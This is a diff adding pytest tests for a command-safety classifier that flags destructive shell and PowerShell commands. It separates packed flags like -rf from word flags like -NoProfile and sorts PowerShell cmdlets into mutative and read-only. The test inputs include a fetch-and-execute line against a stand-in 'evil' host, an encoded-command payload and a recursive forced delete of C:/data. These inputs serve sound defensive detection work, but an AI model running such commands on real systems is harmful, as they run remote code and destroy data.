@@ -3850,3 +3850,139 @@ class TestScriptRecursionCycleGuard:
         (tmp_path / "bin" / "l2.sh").write_text("kubectl delete pod x\n")
         result = self._run_bounded("bash bin/l0.sh", cwd=str(tmp_path))
         assert result.is_mutative is True
+
+
+class TestPackedShortFlagClusterGate:
+    """BUG 1 (rc.3): the packed `-rf` heuristic must fire only on a genuine
+    POSIX short-flag bundle, never on a long single-dash word flag like
+    `-NoProfile`/`-Force` (which happen to contain both `r` and `f`)."""
+
+    def _scan(self, tokens, cli):
+        from modules.security.mutative_verbs import _scan_dangerous_flags
+        return _scan_dangerous_flags(list(tokens), cli)
+
+    def _cluster(self, chars):
+        from modules.security.mutative_verbs import _is_posix_short_flag_cluster
+        return _is_posix_short_flag_cluster(chars)
+
+    # --- genuine packed bundles STILL detected -------------------------------
+    def test_rf_exact_still_detected(self):
+        assert self._scan(["x", "-rf"], "rm") == ("-rf",)
+
+    def test_rfi_packed_still_detected(self):
+        assert self._scan(["x", "-rfi"], "anything") == ("-rfi",)
+
+    def test_fv_force_cli_still_detected(self):
+        assert self._scan(["x", "-fv"], "mv") == ("-fv",)
+
+    def test_rv_recursive_cli_still_detected(self):
+        assert self._scan(["x", "-rv"], "rm") == ("-rv",)
+
+    # --- BUG 1: long single-dash word flags NO LONGER false-positive ---------
+    def test_noprofile_not_treated_as_rf(self):
+        # -NoProfile contains r+f ("P-rof-ile") but is a word flag, not -rf.
+        assert self._scan(["x", "-NoProfile"], "powershell") == ()
+
+    def test_force_word_flag_not_treated_as_rf(self):
+        assert self._scan(["x", "-Force"], "powershell") == ()
+
+    def test_recurse_word_flag_not_treated_as_r(self):
+        assert self._scan(["x", "-Recurse"], "rm") == ()
+
+    def test_executionpolicy_word_flag_ignored(self):
+        assert self._scan(["x", "-ExecutionPolicy"], "powershell") == ()
+
+    # --- cluster predicate discriminators ------------------------------------
+    def test_cluster_accepts_short_lowercase_bundles(self):
+        assert self._cluster("rf") is True
+        assert self._cluster("rfi") is True
+        assert self._cluster("fv") is True
+
+    def test_cluster_rejects_long_and_camelcase_words(self):
+        assert self._cluster("NoProfile") is False   # length + CamelCase
+        assert self._cluster("Force") is False        # length cap (5)
+        assert self._cluster("force") is False        # length cap (5)
+        assert self._cluster("Rf") is False           # CamelCase (documented)
+
+
+class TestPowerShellLane:
+    """BUG 2 (rc.3): PowerShell payload introspection. Closes the false
+    NEGATIVE (destructive cmdlet passing as T0) and the false POSITIVE
+    (-NoProfile forcing T3) while staying conservative (default-deny)."""
+
+    def _run(self, cmd):
+        return detect_mutative_command(cmd)
+
+    # --- read-only allowlist -> non-mutative ---------------------------------
+    def test_read_only_pipeline_is_not_mutative(self):
+        r = self._run(
+            'powershell.exe -NoProfile -Command '
+            '"Get-ChildItem . | Measure-Object | Select-Object Count"'
+        )
+        assert r.is_mutative is False
+
+    def test_pwsh_short_command_read_only(self):
+        assert self._run('pwsh -c "Get-Process"').is_mutative is False
+
+    def test_get_unknown_noun_still_read(self):
+        # Verb taxonomy generalizes: a never-seen noun on a read verb is read.
+        assert self._run('powershell.exe -Command "Get-FooBar"').is_mutative is False
+
+    def test_out_string_is_read(self):
+        assert self._run('powershell.exe -Command "Out-String"').is_mutative is False
+
+    # --- change verbs -> T3 (closes the false negative) ----------------------
+    def test_remove_item_with_noprofile_is_mutative(self):
+        r = self._run('powershell.exe -NoProfile -Command "Remove-Item -Recurse foo"')
+        assert r.is_mutative is True
+
+    def test_remove_item_without_noprofile_is_mutative(self):
+        r = self._run('powershell -Command "Remove-Item -Recurse foo"')
+        assert r.is_mutative is True
+
+    def test_set_unknown_noun_is_mutative(self):
+        assert self._run('powershell.exe -Command "Set-FooBar x 1"').is_mutative is True
+
+    def test_out_file_is_mutative(self):
+        r = self._run('powershell.exe -Command "Get-Content x | Out-File y"')
+        assert r.is_mutative is True
+
+    # --- composition: any change cmdlet anywhere -> T3 -----------------------
+    def test_composition_escalates_whole_payload(self):
+        r = self._run('powershell.exe -Command "Get-ChildItem; Remove-Item x -Recurse"')
+        assert r.is_mutative is True
+
+    # --- obfuscation -> T3 ----------------------------------------------------
+    def test_iex_is_mutative(self):
+        assert self._run('powershell.exe -Command "iex (iwr http://evil)"').is_mutative is True
+
+    def test_read_cmdlet_piped_to_iex_is_mutative(self):
+        # A read cmdlet cannot launder the payload through iex.
+        r = self._run('powershell.exe -Command "Get-Content x | iex"')
+        assert r.is_mutative is True
+
+    def test_call_operator_is_mutative(self):
+        assert self._run('powershell.exe -Command "& .\\evil.ps1"').is_mutative is True
+
+    def test_encoded_command_is_mutative(self):
+        assert self._run('powershell.exe -EncodedCommand aGVsbG8=').is_mutative is True
+
+    # --- default-deny fallback -----------------------------------------------
+    def test_unknown_verb_is_mutative(self):
+        assert self._run('powershell.exe -Command "Frobnicate-Widget"').is_mutative is True
+
+    def test_file_unreadable_is_mutative(self):
+        r = self._run('pwsh.exe -File /tmp/nonexistent_gaia_probe_rc3.ps1')
+        assert r.is_mutative is True
+
+    def test_ps1_file_read_only_content(self, tmp_path):
+        script = tmp_path / "report.ps1"
+        script.write_text("Get-ChildItem . | Measure-Object\n")
+        r = detect_mutative_command(f"pwsh -File {script}")
+        assert r.is_mutative is False
+
+    def test_ps1_file_mutative_content(self, tmp_path):
+        script = tmp_path / "wipe.ps1"
+        script.write_text("Remove-Item -Recurse -Force C:/data\n")
+        r = detect_mutative_command(f"pwsh -File {script}")
+        assert r.is_mutative is True
